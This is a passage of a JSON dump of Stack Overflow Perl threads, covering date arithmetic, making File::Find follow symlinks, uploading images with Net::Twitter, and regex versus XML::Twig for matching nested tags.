date in Seconds: 1464645600\nMax date in Seconds: 1465941600\nNum days: 15\nbash-3.2$ ./testNumDays.pl\nAs extracted from db: mindate: 2016-03-28 and maxdate: 2016-06-15\nMin date in Seconds: 1459116000\nMax date in Seconds: 1465941600\nNum days: 79\nbash-3.2$ ./testNumDays.pl\nAs extracted from db: mindate: 2016-03-27 and maxdate: 2016-06-15\nMin date in Seconds: 1459033200\nMax date in Seconds: 1465941600\nNum days: 79.9583333333333\nbash-3.2$\n</code></pre>\n\n<p>Obviously, the number of calendar dates between dates should be an integer.  Mmmm, what I am doing wrong?  Why is converting to seconds not reliable? </p>\n\n<p>Since I am a Perl newbie, I am probably overlooking the obvious.  Any help is therefore more than welcome.</p>\n"}, {"tags": ["perl", "file-find"], "comments": [{"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "edited": false, "score": 0, "creation_date": 1466083684, "post_id": 37860327, "comment_id": 63178427, "body": "<a href=\"http://perldoc.perl.org/File/Find.html\" rel=\"nofollow noreferrer\">perldoc.perl.org/File/Find.html</a> $File::Find::fullname"}], "answers": [{"tags": [], "owner": {"reputation": 247, "user_id": 6338639, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-dE0EhH0ZVHo/AAAAAAAAAAI/AAAAAAAAAFE/4-Rr-uDV1tM/photo.jpg?sz=128", "display_name": "Mitch Jackson", "link": "https://stackoverflow.com/users/6338639/mitch-jackson"}, "is_accepted": true, "score": 5, "last_activity_date": 1466087150, "last_edit_date": 1466087150, "creation_date": 1466083556, "answer_id": 37860671, "question_id": 37860327, "link": "https://stackoverflow.com/questions/37860327/findfile-in-perl-search-through-symlink-directory/37860671#37860671", "title": "Find:File in Perl - Search through symlink directory", "body": "<p>A close look at the documentation for <a href=\"http://search.cpan.org/~rjbs/perl-5.24.0/ext/File-Find/lib/File/Find.pm\" rel=\"nofollow\">File::Find</a> reveals the error:\nYou have passed a <em>key-value list</em> of parameters instead of a <em>reference to a hash</em> of parameters.</p>\n\n<pre><code># Incorrect: looks like find(@params)\n# asks find to search the list of paths:\n#    ( 'follow', 1, $path )\nfind(\\&amp;Search,follow =&gt; 1, $path);\n\n# Correct: looks like find(\\%params)\nfind({ wanted =&gt; \\&amp;process, follow =&gt; 1 }, $path);\n</code></pre>\n"}], "owner": {"reputation": 269, "user_id": 6239384, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/491422b5d64a8d352c3babc8d2771d6e?s=128&d=identicon&r=PG&f=1", "display_name": "AlexPham", "link": "https://stackoverflow.com/users/6239384/alexpham"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 788, "favorite_count": 0, "accepted_answer_id": 37860671, "answer_count": 1, "score": 0, "last_activity_date": 1466087150, "creation_date": 1466082714, "last_edit_date": 1466083153, "question_id": 37860327, "link": "https://stackoverflow.com/questions/37860327/findfile-in-perl-search-through-symlink-directory", "title": "Find:File in Perl - Search through symlink directory", "body": "<p>Does anyone know how to make File:Find can search through symlink directory?</p>\n\n<p>I have a real directory at </p>\n\n<pre><code>/home/alex/mydir1 \n</code></pre>\n\n<p>and a symlink directory inside</p>\n\n<pre><code>/home/alex/mydir1/test -&gt; ../mydir2\n</code></pre>\n\n<p>Here is my code:</p>\n\n<pre><code>#!/depot/perl-5.8.3/bin/perl\nuse strict;\nuse File::Find qw(find);\n\nmy $path = \"/home/alex/mydir1\";\n\nfind(\\&amp;Search,follow =&gt; 1, $path);\n\nsub Search{\n    my $path = $File::Find::name;\n    print $path.\"\\n\";\n}\n</code></pre>\n\n<p>And the result is:</p>\n\n<pre><code>/home/alex/mydir1\n/home/alex/mydir1/test\n</code></pre>\n\n<p>Why it's not search through /home/alex/mydir2 and print out every files inside ? Can anyone show me how to do that ?</p>\n\n<p>Thank you and best regards.</p>\n\n<p>Alex</p>\n"}, {"tags": ["perl", "api", "twitter"], "answers": [{"comments": [{"owner": {"reputation": 1665, "user_id": 1848140, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/c0bc64ef33e6ab5560ce5c534190a6a0?s=128&d=identicon&r=PG&f=1", "display_name": "Nagaraju", "link": "https://stackoverflow.com/users/1848140/nagaraju"}, "edited": false, "score": 0, "creation_date": 1466136259, "post_id": 37859827, "comment_id": 63202046, "body": "Can you clarify what is binary mode here?"}, {"owner": {"reputation": 1665, "user_id": 1848140, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/c0bc64ef33e6ab5560ce5c534190a6a0?s=128&d=identicon&r=PG&f=1", "display_name": "Nagaraju", "link": "https://stackoverflow.com/users/1848140/nagaraju"}, "edited": false, "score": 0, "creation_date": 1466139068, "post_id": 37859827, "comment_id": 63202762, "body": "Okay I tried using binmode while opening the file using this approach but still the same error"}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 0, "last_activity_date": 1466081546, "creation_date": 1466081546, "answer_id": 37859827, "question_id": 37858881, "link": "https://stackoverflow.com/questions/37858881/unable-to-upload-image-using-twitter-api/37859827#37859827", "title": "unable to upload image using twitter api", "body": "<p><a href=\"https://metacpan.org/pod/Net::Twitter#upload\" rel=\"nofollow\">The documentation</a> is a bit sparse on <code>upload</code>, but it does say it needs something called <em>media</em>. </p>\n\n<blockquote>\n  <h2>upload</h2>\n  \n  <h2>upload(media)</h2>\n  \n  <p>Parameters: media<br>\n  Required: media<br>\n  Upload images to twitter without posting them on the timeline   </p>\n  \n  <p>Returns: Image</p>\n</blockquote>\n\n<p>However, directly above <a href=\"https://metacpan.org/pod/Net::Twitter#update_with_media\" rel=\"nofollow\">at <code>update_with_media</code></a> it describes an entity <em>media</em>.</p>\n\n<blockquote>\n  <p>The <code>media[]</code> parameter is an arrayref with the following\n  interpretation:</p>\n\n<pre><code>[ $file ]\n[ $file, $filename ]\n[ $file, $filename, Content_Type =&gt; $mime_type ]\n[ undef, $filename, Content_Type =&gt; $mime_type, Content =&gt; $raw_image_data ]\n</code></pre>\n</blockquote>\n\n<p>So based on that I would expect that your upload has to look something like this:</p>\n\n<pre><code>my content_of_image_file; # open the file and read its content in binary mode\nmy $result = $nt-&gt;upload([\n  undef,\n  'filename_as_it_should_appear_on_twitter.jpeg', # this is a guess\n  Content_Type =&gt; 'image/jpeg',\n  Content =&gt; encode_base64($content_of_image_file),\n]);\n</code></pre>\n\n<p><strong>Note that I have not tested this.</strong></p>\n"}, {"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466151665, "post_id": 37873880, "comment_id": 63208400, "body": "Ah. I thought you want to just upload."}, {"owner": {"reputation": 1665, "user_id": 1848140, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/c0bc64ef33e6ab5560ce5c534190a6a0?s=128&d=identicon&r=PG&f=1", "display_name": "Nagaraju", "link": "https://stackoverflow.com/users/1848140/nagaraju"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466155472, "post_id": 37873880, "comment_id": 63210814, "body": "may be a bit confusion here, I thought upload will post to timeline initilally, but after I saw your answer and realised what it does and used update_with_media. Anyway I struglled 2hours to get the work done with update_media as there is no proper documentation."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466157584, "post_id": 37873880, "comment_id": 63212230, "body": "I see. Glad it works now. :) You could submit a patch to the author and add more documentation. The github repo is linked on CPAN (<a href=\"https://github.com/semifor/Net-Twitter\" rel=\"nofollow noreferrer\">github.com/semifor/Net-Twitter</a>) I&#39;m sure the author appreciates that."}], "tags": [], "owner": {"reputation": 1665, "user_id": 1848140, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/c0bc64ef33e6ab5560ce5c534190a6a0?s=128&d=identicon&r=PG&f=1", "display_name": "Nagaraju", "link": "https://stackoverflow.com/users/1848140/nagaraju"}, "is_accepted": true, "score": 1, "last_activity_date": 1466141851, "last_edit_date": 1592644375, "creation_date": 1466141851, "answer_id": 37873880, "question_id": 37858881, "link": "https://stackoverflow.com/questions/37858881/unable-to-upload-image-using-twitter-api/37873880#37873880", "title": "unable to upload image using twitter api", "body": "<p>After inspiring from this answer <a href=\"https://stackoverflow.com/a/17678794/1848140\">here</a>.</p>\n<p>I had done the same in perl something like:</p>\n<pre><code>my @filename = ('path/to/image.jepg');\nmy $result = $nt-&gt;update_with_media({status=&gt;'hI',media=&gt;\\@filename});\n</code></pre>\n<p>This worked perfectly. Although only array reference works here.</p>\n<p>Note: According to documentation and from @simbabque answer <a href=\"https://stackoverflow.com/a/37859827/1848140\">link</a></p>\n<blockquote>\n<p>upload    upload(media)</p>\n<p>Parameters: media<br />\nRequired: media<br />\n<strong>Upload images to twitter without posting them on the timeline</strong></p>\n<p>Returns: Image</p>\n</blockquote>\n<p>Which I guess will only upload but doesnot show on timeline. So I used the <code>update_with_media</code> method to post images.</p>\n"}], "owner": {"reputation": 1665, "user_id": 1848140, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/c0bc64ef33e6ab5560ce5c534190a6a0?s=128&d=identicon&r=PG&f=1", "display_name": "Nagaraju", "link": "https://stackoverflow.com/users/1848140/nagaraju"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 201, "favorite_count": 0, "accepted_answer_id": 37873880, "answer_count": 2, "score": 3, "last_activity_date": 1466141851, "creation_date": 1466079136, "question_id": 37858881, "link": "https://stackoverflow.com/questions/37858881/unable-to-upload-image-using-twitter-api", "title": "unable to upload image using twitter api", "body": "<p>I am using twitter API provided by <code>Net::Twitter</code>(<a href=\"http://search.cpan.org/~mmims/Net-Twitter-4.01007/lib/Net/Twitter.pod\" rel=\"nofollow\">cpan link</a>). I am able to post status but unable to upload image.</p>\n\n<p><strong>Perl code:</strong></p>\n\n<pre><code>use strict;\nuse warnings;\nuse MIME::Base64;\n\nuse Net::Twitter;\nuse Scalar::Util 'blessed';\n\n# When no authentication is required:\n#my $nt = Net::Twitter-&gt;new(legacy =&gt; 0);\nmy $consumer_key = \"consumerkey\";\nmy $consumer_secret = \"consumersecret\";\nmy $token=\"token\";\nmy $token_secret=\"tokensecret\";\n\n# As of 13-Aug-2010, Twitter requires OAuth for authenticated requests\nmy $nt = Net::Twitter-&gt;new(\n    traits   =&gt; [qw/API::RESTv1_1/],\n    consumer_key        =&gt; $consumer_key,\n    consumer_secret     =&gt; $consumer_secret,\n    access_token        =&gt; $token,\n    access_token_secret =&gt; $token_secret,\n);\neval { \n#my $result = $nt-&gt;update({status=&gt;'some message'}); ##this works fine\nmy $result = $nt-&gt;upload({media=&gt;'/some/path/toimage.jpeg' ,media_data =&gt; encode_base64('/some/path/toimage.jpeg')}); #this line produces error\n    };\n\nif ( my $err = $@ ) {\n    die $@ unless blessed $err &amp;&amp; $err-&gt;isa('Net::Twitter::Error');\n\n    warn \"HTTP Response Code: \", $err-&gt;code, \"\\n\",\n         \"HTTP Message......: \", $err-&gt;message, \"\\n\",\n         \"Twitter error.....: \", $err-&gt;error, \"\\n\";\n}\n</code></pre>\n\n<p><strong>Error:</strong></p>\n\n<pre><code>HTTP Response Code: 400\n\nHTTP Message......: Bad Request \n\nTwitter error.....: media type unrecognized.\n</code></pre>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 46944, "user_id": 3764814, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d02a4923abd2ca6d7593f031e4222c2?s=128&d=identicon&r=PG", "display_name": "Lucas Trzesniewski", "link": "https://stackoverflow.com/users/3764814/lucas-trzesniewski"}, "edited": false, "score": 3, "creation_date": 1466063060, "post_id": 37852802, "comment_id": 63164370, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags\">RegEx match open tags except XHTML self-contained tags</a>"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466063434, "post_id": 37852802, "comment_id": 63164593, "body": "Is this XML, HTML or something that just looks like it? The duplicate may be valid, but there are cases where a pragmatic regex is fine."}, {"owner": {"reputation": 389, "user_id": 1625076, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/fRfxc.png?s=128&g=1", "display_name": "dellair", "link": "https://stackoverflow.com/users/1625076/dellair"}, "edited": false, "score": 0, "creation_date": 1466063487, "post_id": 37852802, "comment_id": 63164631, "body": "I don&#39;t know if it matters, the tags can be any special characters, so it is a regex question to me. This is XML btw. :)"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466063492, "post_id": 37852802, "comment_id": 63164637, "body": "Also, are we talking PCRE regex, or do you have an actual Perl program?"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1466063958, "post_id": 37852802, "comment_id": 63164927, "body": "It does matter. <code>XML</code> is a contextual language. Regex cannot do context. therefore it&#39;s a terrible solution."}, {"owner": {"reputation": 389, "user_id": 1625076, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/fRfxc.png?s=128&g=1", "display_name": "dellair", "link": "https://stackoverflow.com/users/1625076/dellair"}, "edited": false, "score": 0, "creation_date": 1466064244, "post_id": 37852802, "comment_id": 63165096, "body": "Thanks all above! simbabque has the right answer."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 2, "creation_date": 1466064304, "post_id": 37852802, "comment_id": 63165133, "body": "@Sobrique if it&#39;s a pattern as simple as this, and the format of the input file is always the same, a regex-based solution is totally fine in my opinion. Sometimes it&#39;s ok to be pragmatic."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1466068271, "post_id": 37852802, "comment_id": 63167743, "body": "If it were not trivial to parse as <code>XML</code> using <code>xpath</code> I might agree. As is, this is building brittle code."}], "answers": [{"comments": [{"owner": {"reputation": 389, "user_id": 1625076, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/fRfxc.png?s=128&g=1", "display_name": "dellair", "link": "https://stackoverflow.com/users/1625076/dellair"}, "edited": false, "score": 1, "creation_date": 1466064216, "post_id": 37853090, "comment_id": 63165076, "body": "Cheers, @simbabque, you are absolutely right. And I also worked out a solution: &lt;tag2&gt;&lt;tag3&gt;((?!tag).)*&lt;\\/tag3&gt;&lt;\\/tag2&gt;"}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 2, "last_activity_date": 1466063675, "creation_date": 1466063675, "answer_id": 37853090, "question_id": 37852802, "link": "https://stackoverflow.com/questions/37852802/perl-regular-expression-to-match-embedded-tag-once/37853090#37853090", "title": "Perl regular expression to match embedded tag once", "body": "<p>Your regex didn't work because you were allowing everything (<code>.</code>) in your capture group. That is very greedy and will go as far as possible and only stop at the last <code>&lt;/tag3&gt;</code>. If you want to match only stuff that cannot inlcude tags, you need to match anything but an opening tag token.</p>\n\n<pre><code>m{&lt;tag2&gt;&lt;tag3&gt;([^&lt;]+)&lt;/tag3&gt;&lt;/tag2&gt;}g\n</code></pre>\n\n<p>Try it on <a href=\"https://regex101.com/r/yB7zM4/1\" rel=\"nofollow\">regex101.com</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 1, "last_activity_date": 1466065107, "last_edit_date": 1466065107, "creation_date": 1466064630, "answer_id": 37853424, "question_id": 37852802, "link": "https://stackoverflow.com/questions/37852802/perl-regular-expression-to-match-embedded-tag-once/37853424#37853424", "title": "Perl regular expression to match embedded tag once", "body": "<p>Use an XML aware tool. I tried the following in <a href=\"http://metacpan.org/pod/distribution/XML-XSH2/xsh\" rel=\"nofollow\">xsh</a>, a wrapper around <a href=\"http://p3rl.org/XML::LibXML\" rel=\"nofollow\">XML::LibXML</a>:</p>\n\n<pre><code>ls //tag2[1=count(tag3)]\n</code></pre>\n\n<p>After adding line numbers to the tag2's, I got</p>\n\n<pre><code>&lt;tag2&gt;2&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;\n&lt;tag2&gt;5&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 389, "user_id": 1625076, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/fRfxc.png?s=128&g=1", "display_name": "dellair", "link": "https://stackoverflow.com/users/1625076/dellair"}, "edited": false, "score": 0, "creation_date": 1466093954, "post_id": 37854940, "comment_id": 63186010, "body": "Thanks Sobrique, this may also work, but my real case was a bit complicated and it wasn&#39;t some kind translated XML mapping."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 389, "user_id": 1625076, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/fRfxc.png?s=128&g=1", "display_name": "dellair", "link": "https://stackoverflow.com/users/1625076/dellair"}, "edited": false, "score": 1, "creation_date": 1466094976, "post_id": 37854940, "comment_id": 63186648, "body": "You said in the comments that you were working with XML. If you are, then as complication increases, the case for an XML parser does too."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 4, "last_activity_date": 1466068770, "creation_date": 1466068770, "answer_id": 37854940, "question_id": 37852802, "link": "https://stackoverflow.com/questions/37852802/perl-regular-expression-to-match-embedded-tag-once/37854940#37854940", "title": "Perl regular expression to match embedded tag once", "body": "<p>I would urge you not to use regular expressions to manipulate XML - ever. Regular expressions cannot handle a contextual language like XML, and as a result you build brittle code - that a perfectly valid alteration to XML format (such as whitespacing) might break. </p>\n\n<p>So instead:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\n\nuse XML::Twig;\n\nmy $twig = XML::Twig-&gt;parse( \\*DATA );\n\nforeach my $element ( $twig-&gt;get_xpath('//tag2') ) {\n   if ( scalar $element-&gt;children('tag3') == 1 ) {\n      $element-&gt;print;\n      print \"\\n\";\n   }\n}\n\n__DATA__\n&lt;root&gt;\n&lt;tag1&gt;&lt;tag2&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;\n&lt;tag1&gt;&lt;tag2&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;\n&lt;tag1&gt;&lt;tag2&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;\n&lt;tag1&gt;&lt;tag2&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;\n&lt;tag1&gt;&lt;tag2&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;\n&lt;tag1&gt;&lt;tag2&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;\n&lt;tag1&gt;&lt;tag2&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;\n&lt;tag1&gt;&lt;tag2&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;\n&lt;/root&gt;\n</code></pre>\n\n<p>This will handle XML formatted as you have, but also just on a single line. Or like this:</p>\n\n<pre><code>&lt;root&gt;\n  &lt;tag1&gt;\n    &lt;tag2&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n    &lt;/tag2&gt;\n  &lt;/tag1&gt;\n  &lt;tag1&gt;\n    &lt;tag2&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n    &lt;/tag2&gt;\n  &lt;/tag1&gt;\n  &lt;tag1&gt;\n    &lt;tag2&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n    &lt;/tag2&gt;\n  &lt;/tag1&gt;\n  &lt;tag1&gt;\n    &lt;tag2&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n    &lt;/tag2&gt;\n  &lt;/tag1&gt;\n  &lt;tag1&gt;\n    &lt;tag2&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n    &lt;/tag2&gt;\n  &lt;/tag1&gt;\n  &lt;tag1&gt;\n    &lt;tag2&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n    &lt;/tag2&gt;\n  &lt;/tag1&gt;\n  &lt;tag1&gt;\n    &lt;tag2&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n    &lt;/tag2&gt;\n  &lt;/tag1&gt;\n  &lt;tag1&gt;\n    &lt;tag2&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n      &lt;tag3&gt;Some randome chars&lt;/tag3&gt;\n    &lt;/tag2&gt;\n  &lt;/tag1&gt;\n&lt;/root&gt;\n</code></pre>\n\n<p>Or like this:</p>\n\n<pre><code>&lt;root\n&gt;&lt;tag1\n&gt;&lt;tag2\n&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;&lt;tag1\n&gt;&lt;tag2\n&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;&lt;tag1\n&gt;&lt;tag2\n&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;&lt;tag1\n&gt;&lt;tag2\n&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;&lt;tag1\n&gt;&lt;tag2\n&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;&lt;tag1\n&gt;&lt;tag2\n&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;&lt;tag1\n&gt;&lt;tag2\n&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;&lt;tag1\n&gt;&lt;tag2\n&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;tag3\n&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;&lt;/root&gt;\n</code></pre>\n\n<p>Which are semantically identical to yours. </p>\n"}], "owner": {"reputation": 389, "user_id": 1625076, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/fRfxc.png?s=128&g=1", "display_name": "dellair", "link": "https://stackoverflow.com/users/1625076/dellair"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 63, "favorite_count": 0, "accepted_answer_id": 37853090, "answer_count": 3, "score": 0, "last_activity_date": 1466068770, "creation_date": 1466062831, "question_id": 37852802, "link": "https://stackoverflow.com/questions/37852802/perl-regular-expression-to-match-embedded-tag-once", "title": "Perl regular expression to match embedded tag once", "body": "<p>I have some text which I would like to match based on tag only appears once.\nText is as below (some random chars can contain anything except for tags):</p>\n\n<pre><code>&lt;tag1&gt;&lt;tag2&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;tag3&gt;Some randome chars&lt;/tag3&gt;&lt;/tag2&gt;&lt;/tag1&gt;\n&lt;tag1&gt;&lt;tag2&gt;&lt;tag3&gt;Some randome 